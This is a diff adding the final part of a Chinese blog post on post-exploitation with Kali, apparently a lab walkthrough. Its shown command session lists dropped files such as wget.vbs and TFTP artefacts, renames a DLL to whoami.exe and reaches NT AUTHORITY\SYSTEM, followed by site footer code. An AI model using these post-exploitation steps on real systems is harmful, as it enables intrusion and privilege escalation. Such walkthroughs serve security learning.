+<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> Serial Number is 0CCA-0323</span>
+<span id="cb1-70"><a href="#cb1-70" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-71"><a href="#cb1-71" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Directory</span> of C:<span class="dt">\</span></span>
+<span id="cb1-72"><a href="#cb1-72" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-73"><a href="#cb1-73" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02</span> /07/2022  04:21 PM            21,113 1.DLL</span>
+<span id="cb1-74"><a href="#cb1-74" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02/07/2022</span>  12:54 PM                30 1.txt</span>
+<span id="cb1-75"><a href="#cb1-75" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  04:21 PM            65,516 123.hex</span>
+<span id="cb1-76"><a href="#cb1-76" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 AUTOEXEC.BAT</span>
+<span id="cb1-77"><a href="#cb1-77" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 CONFIG.SYS</span>
+<span id="cb1-78"><a href="#cb1-78" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:28 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Documents and Settings</span>
+<span id="cb1-79"><a href="#cb1-79" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:00 PM             1,176 HistorySvr.txt</span>
+<span id="cb1-80"><a href="#cb1-80" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2010</span>  06:10 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          I386</span>
+<span id="cb1-81"><a href="#cb1-81" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Inetpub</span>
+<span id="cb1-82"><a href="#cb1-82" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:38 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Program Files</span>
+<span id="cb1-83"><a href="#cb1-83" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/27/2022</span>  07:46 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Python27</span>
+<span id="cb1-84"><a href="#cb1-84" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:30 PM               172 test.ps1</span>
+<span id="cb1-85"><a href="#cb1-85" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:27 PM                 0 TFTP4092</span>
+<span id="cb1-86"><a href="#cb1-86" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:25 PM                 0 TFTP588</span>
+<span id="cb1-87"><a href="#cb1-87" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:21 PM             1,113 wget.vbs</span>
+<span id="cb1-88"><a href="#cb1-88" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          WINDOWS</span>
+<span id="cb1-89"><a href="#cb1-89" aria-hidden="true" tabindex="-1"></a>                  <span class="ex">10</span> File<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>         <span class="ex">89,120</span> bytes</span>
+<span id="cb1-90"><a href="#cb1-90" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">6</span> Dir<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>  <span class="ex">39,068,598,272</span> bytes free</span>
+<span id="cb1-91"><a href="#cb1-91" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;copy</span> 1.dll whoami.exe</span>
+<span id="cb1-92"><a href="#cb1-92" aria-hidden="true" tabindex="-1"></a>    <span class="ex">copy</span> 1.dll whoami.exe</span>
+<span id="cb1-93"><a href="#cb1-93" aria-hidden="true" tabindex="-1"></a>            <span class="ex">1</span> file<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">copied.</span></span>
+<span id="cb1-94"><a href="#cb1-94" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-95"><a href="#cb1-95" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;dir</span></span>
+<span id="cb1-96"><a href="#cb1-96" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dir</span></span>
+<span id="cb1-97"><a href="#cb1-97" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> in drive C has no label.</span>
+<span id="cb1-98"><a href="#cb1-98" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> Serial Number is 0CCA-0323</span>
+<span id="cb1-99"><a href="#cb1-99" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-100"><a href="#cb1-100" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Directory</span> of C:<span class="dt">\</span></span>
+<span id="cb1-101"><a href="#cb1-101" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-102"><a href="#cb1-102" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  04:21 PM            21,113 1.DLL</span>
+<span id="cb1-103"><a href="#cb1-103" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  04:21 PM            65,516 123.hex</span>
+<span id="cb1-104"><a href="#cb1-104" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 AUTOEXEC.BAT</span>
+<span id="cb1-105"><a href="#cb1-105" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 CONFIG.SYS</span>
+<span id="cb1-106"><a href="#cb1-106" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:28 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Documents and Settings</span>
+<span id="cb1-107"><a href="#cb1-107" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:00 PM             1,176 HistorySvr.txt</span>
+<span id="cb1-108"><a href="#cb1-108" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2010</span>  06:10 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          I386</span>
+<span id="cb1-109"><a href="#cb1-109" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Inetpub</span>
+<span id="cb1-110"><a href="#cb1-110" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:38 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Program Files</span>
+<span id="cb1-111"><a href="#cb1-111" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/27/2022</span>  07:46 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Python27</span>
+<span id="cb1-112"><a href="#cb1-112" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:30 PM               172 test.ps1</span>
+<span id="cb1-113"><a href="#cb1-113" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:27 PM                 0 TFTP4092</span>
+<span id="cb1-114"><a href="#cb1-114" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:25 PM                 0 TFTP588</span>
+<span id="cb1-115"><a href="#cb1-115" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:21 PM             1,113 wget.vbs</span>
+<span id="cb1-116"><a href="#cb1-116" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02</span> /07/2022  04:21 PM            21,113 whoami.exe</span>
+<span id="cb1-117"><a href="#cb1-117" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          WINDOWS</span>
+<span id="cb1-118"><a href="#cb1-118" aria-hidden="true" tabindex="-1"></a>                  <span class="ex">10</span> File<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>        <span class="ex">110,203</span> bytes</span>
+<span id="cb1-119"><a href="#cb1-119" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">6</span> Dir<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>  <span class="ex">39,068,573,696</span> bytes free <span class="pp">**</span>C:\ <span class="op">&gt;</span>whoami</span>
+<span id="cb1-120"><a href="#cb1-120" aria-hidden="true" tabindex="-1"></a>    <span class="fu">whoami</span><span class="pp">**</span> <span class="pp">**</span>NT AUTHORITY\SYSTEM<span class="pp">**</span></span>
+<span id="cb1-121"><a href="#cb1-121" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-122"><a href="#cb1-122" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;</span></span></code></pre></div>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/" title="Kali 后渗透">https://z9m8r8.github.io/2022/02/07/Kali 后渗透/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 后渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/05/EXP/" rel="prev" title="EXP">
+                  <i class="fa fa-angle-left"></i> EXP
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/08/%E5%9B%BE%E7%81%B5%E5%8F%AF%E8%AF%86%E5%88%AB%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%9B%BE%E7%81%B5%E5%8F%AF%E5%88%A4%E5%AE%9A%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%B3%E7%B3%BB/" rel="next" title="图灵可识别语言与图灵可判定语言的关系">
+                  图灵可识别语言与图灵可判定语言的关系 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
